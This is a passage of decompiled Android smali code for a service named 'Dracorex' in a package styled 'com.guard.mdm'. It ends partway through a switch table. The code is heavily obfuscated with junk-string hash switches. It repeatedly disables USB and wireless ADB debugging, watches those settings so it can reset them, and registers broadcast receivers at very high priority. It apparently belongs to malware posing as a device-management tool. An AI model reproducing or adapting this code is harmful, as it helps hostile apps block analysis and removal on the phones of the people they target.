.class public Lcom/guard/mdm/Dracorex;
.super Landroid/app/admin/DeviceAdminService;


# static fields
.field public static final d:I


# instance fields
.field public a:Lcom/guard/mdm/k;

.field public b:Lcom/guard/mdm/h;

.field public final c:Lcom/guard/mdm/c;


# direct methods
.method public constructor <init>()V
    .registers 3

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminService;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/guard/mdm/Dracorex;->a:Lcom/guard/mdm/k;

    new-instance v0, Lcom/guard/mdm/c;

    const/4 v1, 0x1

    invoke-direct {v0, p0, v1}, Lcom/guard/mdm/c;-><init>(Landroid/content/ContextWrapper;I)V

    iput-object v0, p0, Lcom/guard/mdm/Dracorex;->c:Lcom/guard/mdm/c;

    return-void
.end method


# virtual methods
.method public final a()V
    .registers 4

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "adb_wifi_enabled"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z

    const-string v1, "adb_enabled"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Landroid/provider/Settings$Global;->putInt(Landroid/content/ContentResolver;Ljava/lang/String;I)Z
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_10} :catch_11

    :goto_10
    return-void

    :catch_11
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    goto :goto_10
.end method

.method public final onCreate()V
    .registers 13

    const/16 v11, 0x21

    const/4 v10, 0x2

    const/4 v1, 0x0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    :try_start_7
    invoke-static {p0}, Lcom/guard/mdm/k;->c(Landroid/content/Context;)Lcom/guard/mdm/k;

    move-result-object v0

    iput-object v0, p0, Lcom/guard/mdm/Dracorex;->a:Lcom/guard/mdm/k;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_d} :catch_189

    :goto_d
    new-instance v0, Lcom/guard/mdm/f;

    invoke-direct {v0, p0}, Lcom/guard/mdm/f;-><init>(Landroid/content/Context;)V

    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    invoke-static {}, Lcom/guard/Aardonyx/a;->g()[Ljava/lang/String;

    move-result-object v4

    array-length v5, v4

    move v0, v1

    :goto_1d
    const v6, 0x1409f9d0    # 6.965999E-27f

    const-string v2, "\u06d9\u06eb\u06e0\u06d6\u06df\u06e6\u06d8\u06e5\u06e8\u06e1\u06e0\u06ec\u06df\u06e5\u06e1\u06d7\u06d9\u06d9\u06e6\u06d8\u06e7\u06e1\u06e2\u06d8\u06e0\u06ec\u06e4\u06e5\u06d6\u06d8\u06e2\u06d7"

    :goto_22
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_18c

    goto :goto_22

    :sswitch_2b
    const v7, -0x7f6f2e24

    const-string v2, "\u06df\u06db\u06d6\u06e2\u06dc\u06e5\u06d8\u06df\u06e8\u06d6\u06d8\u06e6\u06e8\u06e5\u06d8\u06e0\u06da\u06d6\u06d8\u06d7\u06e8\u06e8\u06d8\u06df\u06e1\u06d9\u06da\u06df\u06db\u06d6\u06d6\u06e7\u06d8\u06d8\u06df\u06e5\u06d8\u06e5\u06d8\u06e8\u06df\u06e4\u06d6\u06d8\u06e7\u06e7\u06d9\u06e5\u06d7\u06e4\u06d9\u06d8\u06d8\u06da\u06d6\u06da\u06e7\u06e0\u06e2\u06dc"

    :goto_30
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_19e

    goto :goto_30

    :sswitch_39
    if-ge v0, v5, :cond_41

    const-string v2, "\u06e7\u06d7\u06e5\u06d9\u06df\u06e1\u06d8\u06db\u06e5\u06d6\u06d8\u06db\u06d7\u06eb\u06e6\u06eb\u06db\u06e5\u06d7\u06da\u06e2\u06e8\u06d6\u06d6\u06d6\u06d9\u06da\u06da\u06ec\u06d8\u06df\u06d8\u06d8\u06e4\u06d6\u06db\u06e5\u06d6\u06e1\u06d8\u06d9\u06e1\u06e8\u06ec\u06df\u06db"

    goto :goto_30

    :sswitch_3e
    const-string v2, "\u06e8\u06df\u06e4\u06da\u06e2\u06ec\u06d6\u06df\u06e4\u06d7\u06e2\u06dc\u06e6\u06ec\u06dc\u06d6\u06d8\u06d8\u06df\u06e6\u06dc\u06d8\u06e5\u06dc\u06df\u06df\u06e6\u06d8\u06e1\u06e4\u06e2\u06d7\u06d7\u06d6\u06d8\u06db\u06e5\u06e2\u06d9\u06e7\u06ec\u06d9\u06dc"

    goto :goto_22

    :cond_41
    const-string v2, "\u06e0\u06e7\u06e2\u06e5\u06e4\u06e4\u06df\u06e5\u06e8\u06d8\u06e0\u06d9\u06e8\u06e7\u06e0\u06e6\u06d6\u06d8\u06da\u06e8\u06e5\u06d6\u06d7\u06d9\u06e7\u06ec\u06da\u06df\u06e6\u06d9\u06e7\u06d6\u06db\u06d9\u06e4\u06dc\u06e6\u06dc\u06d6\u06e8\u06d9\u06d7"

    goto :goto_30

    :sswitch_44
    const-string v2, "\u06e6\u06e5\u06e6\u06e4\u06ec\u06e6\u06ec\u06e5\u06db\u06e0\u06e4\u06e2\u06e1\u06e0\u06e5\u06d8\u06e5\u06df\u06e7\u06e1\u06ec\u06e6\u06d8\u06da\u06e4\u06d8\u06d8\u06d7\u06d9\u06da\u06df\u06e4\u06e4\u06e8\u06d6\u06e2\u06da\u06db"

    goto :goto_30

    :sswitch_47
    const-string v2, "\u06d9\u06e7\u06d6\u06d8\u06e7\u06df\u06d8\u06e4\u06e1\u06e8\u06d9\u06df\u06d6\u06ec\u06db\u06dc\u06d8\u06db\u06e8\u06e8\u06d8\u06da\u06e8\u06d9\u06d6\u06eb\u06db\u06e0\u06e4\u06dc\u06e4\u06ec\u06dc\u06d8\u06e5\u06e5\u06d6\u06e0\u06dc\u06e5\u06d6\u06d7\u06db\u06d6\u06da\u06d8"

    goto :goto_22

    :sswitch_4a
    const-string v2, "\u06eb\u06d8\u06d6\u06e7\u06eb\u06e4\u06e8\u06e8\u06eb\u06db\u06dc\u06d9\u06e5\u06d7\u06df\u06dc\u06d7\u06dc\u06e0\u06d6\u06d7\u06d6\u06d8\u06d7\u06db\u06e1\u06e1\u06db\u06e6\u06e8\u06db\u06ec\u06e7\u06da\u06d6\u06e7\u06e5\u06d8\u06e1\u06e7\u06eb\u06e6\u06da\u06da\u06ec\u06e1\u06e4\u06d6\u06d8\u06e2\u06e1\u06e4"

    goto :goto_22

    :sswitch_4d
    aget-object v2, v4, v0

    invoke-virtual {v3, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_1d

    :sswitch_55
    const v0, 0x5f5e102

    invoke-virtual {v3, v0}, Landroid/content/IntentFilter;->setPriority(I)V

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    iget-object v4, p0, Lcom/guard/mdm/Dracorex;->c:Lcom/guard/mdm/c;

    const v5, -0x63798b39

    const-string v0, "\u06e2\u06d8\u06da\u06db\u06e0\u06e2\u06e5\u06e6\u06e6\u06d8\u06e7\u06e4\u06d7\u06d6\u06eb\u06d8\u06d8\u06eb\u06e1\u06df\u06e2\u06d6\u06e1\u06d8\u06d9\u06dc\u06dc\u06d8\u06e1\u06e8\u06ec\u06e5\u06d9\u06e8"

    :goto_64
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_1b0

    goto :goto_64

    :sswitch_6d
    const v6, 0x3e4d12a9

    const-string v0, "\u06df\u06d8\u06d6\u06d8\u06d8\u06d8\u06d6\u06d8\u06d6\u06dc\u06e7\u06e2\u06e8\u06d8\u06e7\u06e7\u06e6\u06d8\u06ec\u06d8\u06d9\u06df\u06df\u06e2\u06d8\u06e7\u06d8\u06e5\u06d8\u06db\u06dc\u06d8\u06e8\u06e8\u06e5\u06dc\u06df\u06dc\u06d9\u06dc\u06e0\u06e1\u06d8\u06d6\u06e5\u06e6\u06d8"

    :goto_72
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_1c2

    goto :goto_72

    :sswitch_7b
    const-string v0, "\u06eb\u06ec\u06e5\u06d9\u06e1\u06db\u06d9\u06db\u06df\u06da\u06df\u06e1\u06d8\u06e2\u06e7\u06e8\u06e8\u06d9\u06e1\u06d8\u06e2\u06d6\u06e6\u06d8\u06d6\u06db\u06e6\u06df\u06db\u06d7\u06e0\u06e6\u06e8\u06d8\u06ec\u06e4\u06dc\u06e5\u06d9\u06dc"

    goto :goto_64

    :sswitch_7e
    const-string v0, "\u06dc\u06e1\u06d8\u06e6\u06d8\u06e1\u06ec\u06d6\u06da\u06df\u06e8\u06e6\u06e4\u06d9\u06ec\u06e0\u06df\u06e8\u06d8\u06e1\u06e4\u06ec\u06eb\u06d8\u06e7\u06d9\u06d6\u06e6\u06d8\u06e0\u06d9\u06e5\u06d7\u06db\u06d8\u06d7\u06e1\u06da\u06d7\u06dc\u06e5\u06df\u06df\u06d6\u06e8\u06dc\u06ec\u06d8\u06dc\u06e5\u06d9\u06e0\u06eb\u06d6\u06e0\u06e2"

    goto :goto_64

    :cond_81
    const-string v0, "\u06ec\u06e1\u06e5\u06e6\u06d8\u06db\u06da\u06d7\u06db\u06d6\u06da\u06e4\u06df\u06e5\u06da\u06e6\u06d8\u06e7\u06dc\u06e5\u06d8\u06e8\u06e6\u06d8\u06e5\u06e5\u06d7\u06e7\u06df\u06e6\u06df\u06d9\u06d9\u06df\u06e6\u06e1\u06d8\u06e8\u06e2\u06d6\u06d9\u06e1\u06e1\u06d8\u06e6\u06e0\u06d9\u06e5\u06d9\u06da\u06db\u06e5\u06e8\u06e5\u06ec"

    goto :goto_72

    :sswitch_84
    if-lt v2, v11, :cond_81

    const-string v0, "\u06e4\u06df\u06e2\u06d6\u06d6\u06e4\u06e7\u06d6\u06df\u06e5\u06d8\u06d8\u06dc\u06d7\u06e6\u06d8\u06eb\u06da\u06d8\u06d8\u06e5\u06df\u06e6\u06ec\u06d9\u06e5\u06eb\u06d9\u06e1\u06d8\u06e6\u06df\u06e8\u06d8\u06d7\u06dc\u06dc\u06d8\u06e5\u06db\u06dc\u06e2\u06dc\u06e0\u06e2\u06d8\u06d6\u06d6\u06e2\u06dc\u06d7\u06e4\u06d9\u06e7\u06d6\u06d8\u06d9\u06d7\u06e6\u06d8"

    goto :goto_72

    :sswitch_89
    const-string v0, "\u06e5\u06d9\u06d9\u06df\u06dc\u06e1\u06d8\u06e6\u06e8\u06ec\u06e2\u06d9\u06db\u06e8\u06df\u06dc\u06d8\u06eb\u06e5\u06d6\u06d6\u06d7\u06da\u06e4\u06d8\u06d7\u06d8\u06df\u06eb\u06df\u06e6\u06e0\u06e7\u06db\u06e6\u06e8\u06e7"

    goto :goto_72

    :sswitch_8c
    const-string v0, "\u06d6\u06d7\u06e8\u06e0\u06e0\u06e0\u06e0\u06e5\u06d8\u06d8\u06e1\u06df\u06e6\u06e8\u06e1\u06d7\u06df\u06d9\u06e4\u06e2\u06e1\u06d8\u06dc\u06db\u06db\u06e1\u06d6\u06d8\u06d8\u06eb\u06e8\u06eb\u06d6\u06e8\u06d7\u06eb\u06d7\u06e1\u06d8\u06e2\u06d6\u06da\u06e4\u06e4\u06e2\u06e1\u06e5\u06da\u06dc\u06ec"

    goto :goto_64

    :sswitch_8f
    invoke-virtual {p0, v4, v3, v10}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    :goto_92
    new-instance v3, Landroid/content/IntentFilter;

    invoke-direct {v3}, Landroid/content/IntentFilter;-><init>()V

    invoke-static {}, Lcom/guard/Aardonyx/a;->i()[Ljava/lang/String;

    move-result-object v5

    array-length v6, v5

    move v0, v1

    :goto_9d
    const v7, 0xf87f7f2

    const-string v2, "\u06eb\u06da\u06e2\u06dc\u06e1\u06dc\u06db\u06dc\u06e7\u06e6\u06e2\u06da\u06e1\u06dc\u06d8\u06d6\u06e4\u06eb\u06e0\u06d8\u06e6\u06d8\u06e0\u06db\u06e6\u06d8\u06e5\u06e8\u06e1\u06da\u06d8\u06e6\u06da\u06e8\u06e8\u06d8\u06dc\u06d6\u06e8\u06d8\u06d9\u06e2\u06e2\u06ec\u06eb\u06e6"

    :goto_a2
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_1d4

    goto :goto_a2

    :sswitch_ab
    const-string v2, "\u06d7\u06da\u06e1\u06d8\u06d7\u06df\u06e7\u06e6\u06d7\u06d8\u06df\u06d6\u06dc\u06d8\u06e5\u06e2\u06df\u06e0\u06d7\u06e5\u06d8\u06e7\u06da\u06d8\u06e5\u06eb\u06e2\u06e4\u06e8\u06d8\u06dc\u06d9\u06ec\u06d7\u06d7\u06d8\u06d8\u06e8\u06e2\u06e5\u06e4\u06d7\u06d8\u06d8\u06d6\u06df\u06d8"

    goto :goto_a2

    :sswitch_ae
    invoke-virtual {p0, v4, v3}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    goto :goto_92

    :sswitch_b2
    const-string v2, "\u06d8\u06df\u06df\u06ec\u06e6\u06ec\u06d9\u06db\u06d6\u06d8\u06e6\u06e0\u06db\u06d6\u06da\u06d6\u06d8\u06e7\u06d7\u06d6\u06df\u06e6\u06d8\u06d9\u06e5\u06dc\u06d8\u06e8\u06e5\u06e5\u06e6\u06ec\u06d6\u06d8"

    goto :goto_a2

    :sswitch_b5
    const v8, -0x18552dc7

    const-string v2, "\u06d9\u06d6\u06e4\u06dc\u06db\u06dc\u06ec\u06d7\u06e2\u06df\u06dc\u06e4\u06e8\u06e2\u06d9\u06e0\u06d6\u06e5\u06da\u06ec\u06eb\u06db\u06e5\u06d8\u06da\u06e7\u06e5\u06eb\u06da\u06e7\u06d9\u06ec\u06d7\u06e1\u06e5\u06db\u06e0\u06e1\u06d6\u06d8\u06d9\u06e7\u06e6\u06d8"

    :goto_ba
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_1e6

    goto :goto_ba

    :sswitch_c3
    const-string v2, "\u06e4\u06e1\u06e4\u06e4\u06e8\u06e0\u06e0\u06e5\u06da\u06db\u06e4\u06dc\u06d9\u06d6\u06da\u06d9\u06d9\u06e2\u06d8\u06db\u06e1\u06d8\u06ec\u06d8\u06db\u06e6\u06d8\u06e5\u06d9\u06e4\u06ec\u06ec\u06db\u06e7\u06e2\u06e8\u06e8"

    goto :goto_ba

    :cond_c6
    const-string v2, "\u06e1\u06e2\u06e0\u06d8\u06df\u06e0\u06ec\u06d7\u06e7\u06e5\u06e4\u06e1\u06dc\u06db\u06e7\u06e1\u06df\u06ec\u06e0\u06e4\u06e7\u06d6\u06e5\u06e2\u06e7\u06d9\u06e4\u06e2\u06dc\u06e1\u06e0\u06db\u06da\u06e6\u06e2\u06db\u06e8\u06dc\u06e0\u06e7\u06d9\u06e8\u06da\u06db\u06e6\u06e7\u06e8\u06d8\u06d6\u06e1\u06da\u06da\u06e2\u06d8\u06d8"

    goto :goto_ba

    :sswitch_c9
    if-ge v0, v6, :cond_c6

    const-string v2, "\u06e0\u06e8\u06e8\u06e7\u06d8\u06e0\u06d9\u06da\u06e7\u06eb\u06e8\u06e7\u06d8\u06e7\u06e7\u06e7\u06e8\u06e4\u06ec\u06d8\u06dc\u06eb\u06d9\u06ec\u06e6\u06d8\u06e0\u06e8\u06d6\u06d8\u06e8\u06d6\u06d7\u06e2\u06e1\u06e8\u06e6\u06e5\u06df\u06d9\u06d6\u06e5\u06d8\u06e6\u06e4\u06dc\u06d8\u06df\u06df\u06e4\u06e6\u06e6\u06d9\u06e7\u06da\u06df\u06d9\u06e4\u06d6"

    goto :goto_ba

    :sswitch_ce
    const-string v2, "\u06e5\u06e0\u06ec\u06e5\u06e8\u06d8\u06d8\u06d6\u06e2\u06e5\u06d8\u06d7\u06dc\u06da\u06e8\u06e6\u06e8\u06e1\u06e6\u06e7\u06d8\u06d9\u06df\u06e5\u06d8\u06e8\u06e6\u06df\u06e5\u06da\u06e5\u06d9\u06ec\u06e6\u06e5\u06e5\u06e7\u06d8\u06da\u06ec\u06d8\u06d8\u06ec\u06ec\u06e8\u06df\u06db\u06d6\u06d8"

    goto :goto_a2

    :sswitch_d1
    aget-object v2, v5, v0

    invoke-virtual {v3, v2}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_9d

    :sswitch_d9
    const v2, 0x177ea73c

    const-string v0, "\u06e1\u06db\u06e1\u06e8\u06d8\u06d8\u06e4\u06dc\u06d9\u06d7\u06e7\u06e8\u06da\u06d9\u06d9\u06df\u06eb\u06e1\u06d8\u06e5\u06e4\u06dc\u06d8\u06ec\u06e8\u06e1\u06e0\u06d6\u06da\u06e4\u06eb\u06e0\u06df\u06dc\u06d6\u06d8\u06d8\u06e4\u06dc\u06e0\u06d7\u06db\u06ec\u06d9\u06eb\u06df\u06e0\u06e1\u06d8\u06e4\u06e7\u06e4"

    :goto_de
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v2

    sparse-switch v5, :sswitch_data_1f8

    goto :goto_de

    :sswitch_e7
    invoke-virtual {p0, v4, v3, v10}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;I)Landroid/content/Intent;

    :goto_ea
    const v2, 0x54946b67

    const-string v0, "\u06e4\u06d8\u06e8\u06d8\u06e2\u06e7\u06e0\u06e6\u06e5\u06ec\u06d8\u06e4\u06d6\u06d8\u06dc\u06e1\u06d8\u06dc\u06e2\u06e5\u06d8\u06e0\u06d8\u06e1\u06e2\u06df\u06e1\u06d8\u06d7\u06ec\u06e6\u06d8\u06ec\u06dc\u06e0\u06df\u06e1\u06e1\u06e4\u06e7\u06e1\u06d8"

    :goto_ef
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_20a

    goto :goto_ef

    :sswitch_f8
    const v3, 0x7b376094

    const-string v0, "\u06d8\u06d9\u06e4\u06d7\u06e2\u06d9\u06d9\u06e4\u06df\u06e8\u06d9\u06ec\u06e6\u06df\u06da\u06d9\u06d9\u06e5\u06da\u06e7\u06da\u06d8\u06e4\u06e2\u06da\u06e5\u06da\u06d8\u06eb\u06dc\u06d8\u06e4\u06e0\u06e1\u06d8\u06ec\u06eb\u06da\u06da\u06d9\u06df\u06e4\u06e1\u06e5\u06d8\u06d9\u06e1\u06e6\u06d8\u06d6\u06d8\u06e1\u06e4\u06e7\u06d8\u06d7\u06e2\u06d8\u06d8"

    :goto_fd
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_21c

    goto :goto_fd

    :sswitch_106
    const-string v0, "\u06e1\u06e2\u06da\u06df\u06ec\u06d6\u06dc\u06e2\u06e1\u06d6\u06d8\u06e5\u06d8\u06e1\u06e0\u06e8\u06d8\u06df\u06d6\u06e5\u06d8\u06dc\u06e8\u06db\u06df\u06e5\u06d7\u06d9\u06dc\u06e7\u06d8\u06d7\u06df\u06dc\u06d8\u06e6\u06e5\u06e2\u06d7\u06e4\u06dc\u06e4\u06df\u06e6\u06e2\u06e6\u06d6\u06d8\u06d9\u06d8\u06dc\u06d8\u06e2\u06e4\u06df\u06e7\u06e7\u06d6\u06d8\u06e1\u06d6\u06e8\u06d8"

    goto :goto_ef

    :sswitch_109
    const-string v0, "\u06da\u06d9\u06d8\u06ec\u06eb\u06d8\u06e2\u06e2\u06eb\u06eb\u06eb\u06d8\u06d8\u06db\u06e4\u06df\u06e2\u06e4\u06ec\u06e8\u06d8\u06d8\u06dc\u06e8\u06d7\u06d6\u06ec\u06e0\u06dc\u06dc\u06d8\u06dc\u06e1\u06da\u06e6\u06e7\u06e5"

    goto :goto_de

    :sswitch_10c
    const v5, -0x71d3e931

    const-string v0, "\u06da\u06d6\u06e6\u06d7\u06dc\u06e2\u06d7\u06e6\u06e6\u06eb\u06e2\u06d8\u06df\u06d9\u06e1\u06d8\u06e2\u06dc\u06e8\u06d8\u06df\u06e1\u06d8\u06d8\u06da\u06eb\u06d8\u06d7\u06ec\u06d7\u06e2\u06dc\u06dc\u06d8\u06d9\u06d8\u06d9\u06eb\u06e1\u06d8\u06d6\u06dc\u06e1\u06d8\u06ec\u06d8\u06e5"

    :goto_111
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_22e

    goto :goto_111

    :sswitch_11a
    const-string v0, "\u06e6\u06e6\u06d9\u06d7\u06d8\u06e4\u06e1\u06e4\u06e0\u06d9\u06d7\u06df\u06da\u06da\u06e6\u06d8\u06e5\u06eb\u06e4\u06d8\u06dc\u06dc\u06d7\u06e8\u06e8\u06e8\u06e1\u06df\u06e5\u06e0\u06dc\u06dc\u06e8\u06d8\u06d8\u06eb\u06e5"

    goto :goto_111

    :cond_11d
    const-string v0, "\u06e6\u06d7\u06da\u06e0\u06ec\u06d6\u06d8\u06e2\u06dc\u06d7\u06e6\u06df\u06e5\u06ec\u06db\u06df\u06e6\u06e1\u06eb\u06d8\u06d6\u06db\u06dc\u06d8\u06e6\u06d8\u06eb\u06e0\u06dc"

    goto :goto_111

    :sswitch_120
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v11, :cond_11d

    const-string v0, "\u06ec\u06dc\u06eb\u06e5\u06ec\u06ec\u06d6\u06d7\u06e2\u06e4\u06d9\u06ec\u06e5\u06ec\u06e1\u06ec\u06d8\u06d8\u06df\u06e5\u06d6\u06d8\u06df\u06e5\u06d9\u06e1\u06e1\u06d8\u06d8\u06d7\u06d9\u06e7\u06db\u06df\u06da\u06eb\u06e0\u06e8\u06d6\u06db\u06e2\u06e7\u06e5\u06e5\u06d8"

    goto :goto_111

    :sswitch_127
    const-string v0, "\u06e6\u06e7\u06d8\u06db\u06e7\u06d6\u06d9\u06e4\u06e2\u06df\u06e8\u06d9\u06df\u06d7\u06e6\u06e8\u06df\u06e8\u06e7\u06da\u06d8\u06d8\u06e4\u06e4\u06e4\u06d8\u06e1\u06e2\u06d7\u06e6\u06d9\u06da\u06d8\u06d6\u06d8\u06e8\u06d9\u06d8\u06da\u06d8\u06db\u06db\u06e0\u06df\u06e0\u06d9\u06e8\u06d8\u06e4\u06d8\u06e1\u06d8"

    goto :goto_de

    :sswitch_12a
    const-string v0, "\u06eb\u06df\u06e1\u06e0\u06ec\u06e1\u06eb\u06dc\u06dc\u06e6\u06d9\u06dc\u06d8\u06d8\u06eb\u06e0\u06ec\u06e8\u06e5\u06e7\u06e1\u06dc\u06d8\u06d8\u06e1\u06d9\u06d8\u06d6\u06e8\u06eb\u06e7\u06e5\u06d8"

    goto :goto_de

    :sswitch_12d
    invoke-virtual {p0, v4, v3}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    goto :goto_ea

    :cond_131
    const-string v0, "\u06ec\u06e1\u06e5\u06d8\u06e5\u06ec\u06e7\u06e4\u06d9\u06e1\u06e8\u06e4\u06e2\u06eb\u06e6\u06d7\u06e0\u06db\u06d6\u06e0\u06d7\u06e4\u06d7\u06e8\u06e7\u06da\u06ec\u06e4\u06e0\u06ec\u06d6\u06d8"

    goto :goto_fd

    :sswitch_134
    iget-object v0, p0, Lcom/guard/mdm/Dracorex;->a:Lcom/guard/mdm/k;

    invoke-virtual {v0}, Lcom/guard/mdm/k;->b()Z

    move-result v0

    if-nez v0, :cond_131

    const-string v0, "\u06e5\u06da\u06d8\u06d8\u06d8\u06d9\u06df\u06e1\u06d6\u06d9\u06df\u06e2\u06dc\u06d8\u06e6\u06e0\u06e5\u06d8\u06dc\u06e8\u06e5\u06d8\u06da\u06d6\u06d8\u06d8\u06dc\u06e4\u06e8\u06e0\u06dc\u06e6\u06e5\u06ec\u06e8"

    goto :goto_fd

    :sswitch_13f
    const-string v0, "\u06d7\u06d6\u06e1\u06d8\u06d6\u06d9\u06eb\u06d9\u06e8\u06e6\u06d8\u06e0\u06ec\u06db\u06d8\u06d7\u06dc\u06dc\u06dc\u06e6\u06df\u06eb\u06d8\u06d8\u06e5\u06eb\u06d8\u06d8\u06e6\u06db\u06d7\u06e8\u06d9\u06e8\u06e6\u06eb\u06df\u06e5\u06d8\u06d6\u06e7\u06e5\u06d8\u06d6\u06e7\u06e5\u06db\u06e1\u06e2\u06ec\u06db\u06d8"

    goto :goto_fd

    :sswitch_142
    const-string v0, "\u06df\u06df\u06db\u06e8\u06da\u06d6\u06d8\u06e7\u06dc\u06d9\u06dc\u06db\u06e6\u06d8\u06e7\u06da\u06d6\u06d8\u06e4\u06df\u06d8\u06e5\u06d9\u06d8\u06e4\u06e7\u06dc\u06e8\u06e6\u06ec\u06e7\u06df\u06ec"

    goto :goto_ef

    :sswitch_145
    const-string v0, "\u06db\u06d8\u06e6\u06e2\u06eb\u06d8\u06d9\u06da\u06e5\u06df\u06e2\u06e1\u06db\u06d8\u06db\u06df\u06d8\u06d6\u06ec\u06e5\u06df\u06e1\u06d6\u06d6\u06d8\u06eb\u06db\u06eb\u06e5\u06e6\u06d6\u06d8\u06e0\u06df\u06d6\u06d8\u06d7\u06da\u06d8\u06d8\u06e2\u06d6\u06d8\u06d8\u06d9\u06e0\u06e8\u06d8\u06d9\u06e1\u06e1\u06d8\u06df\u06d8\u06d6"

    goto :goto_ef

    :sswitch_148
    invoke-virtual {p0}, Lcom/guard/mdm/Dracorex;->a()V

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v2, "adb_enabled"

    invoke-static {v2}, Landroid/provider/Settings$Global;->getUriFor(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const-string v3, "adb_wifi_enabled"

    invoke-static {v3}, Landroid/provider/Settings$Global;->getUriFor(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    new-instance v4, Lcom/guard/mdm/h;

    new-instance v5, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v6

    invoke-direct {v5, v6}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    invoke-direct {v4, p0, v5, v2, v3}, Lcom/guard/mdm/h;-><init>(Lcom/guard/mdm/Dracorex;Landroid/os/Handler;Landroid/net/Uri;Landroid/net/Uri;)V

    iput-object v4, p0, Lcom/guard/mdm/Dracorex;->b:Lcom/guard/mdm/h;

    invoke-virtual {v0, v2, v1, v4}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    iget-object v2, p0, Lcom/guard/mdm/Dracorex;->b:Lcom/guard/mdm/h;

    invoke-virtual {v0, v3, v1, v2}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    :sswitch_173
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, LH/b;

    const/16 v2, 0x9

    invoke-direct {v1, v2, p0}, LH/b;-><init>(ILjava/lang/Object;)V

    const-wide/16 v2, 0xfa0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :catch_189
    move-exception v0

    goto/16 :goto_d

    :sswitch_data_18c
    .sparse-switch
        -0x24114485 -> :sswitch_4d
        -0x185d7ad -> :sswitch_2b
        0x4326f3c1 -> :sswitch_4a
        0x6d7a81c1 -> :sswitch_55
    .end sparse-switch

    :sswitch_data_19e
    .sparse-switch
        -0x6acd33fd -> :sswitch_39
        -0x56b40dd2 -> :sswitch_44
        -0x4ab350eb -> :sswitch_3e
        0x331970a3 -> :sswitch_47
    .end sparse-switch

    :sswitch_data_1b0
    .sparse-switch
        -0x68c915c4 -> :sswitch_8c
        -0x58668408 -> :sswitch_6d
        -0x400c39c7 -> :sswitch_ae
        0x3f3bbb85 -> :sswitch_8f
    .end sparse-switch

    :sswitch_data_1c2
    .sparse-switch
        -0x77f2d80b -> :sswitch_7b
        -0x381f6571 -> :sswitch_89
        -0x1103d015 -> :sswitch_7e
        -0xadcd068 -> :sswitch_84
    .end sparse-switch

    :sswitch_data_1d4
    .sparse-switch
        -0x60a19cda -> :sswitch_d9
        -0xc152b7c -> :sswitch_ab
        0x3e4ecb88 -> :sswitch_d1
        0x7718eb61 -> :sswitch_b5
    .end sparse-switch

    :sswitch_data_1e6
    .sparse-switch
        -0x66374368 -> :sswitch_c9
        0x52c495c9 -> :sswitch_b2
        0x6708d78f -> :sswitch_c3
        0x7bc79a4c -> :sswitch_ce
    .end sparse-switch

    :sswitch_data_1f8
    .sparse-switch
        0x4ca81d9 -> :sswitch_12a
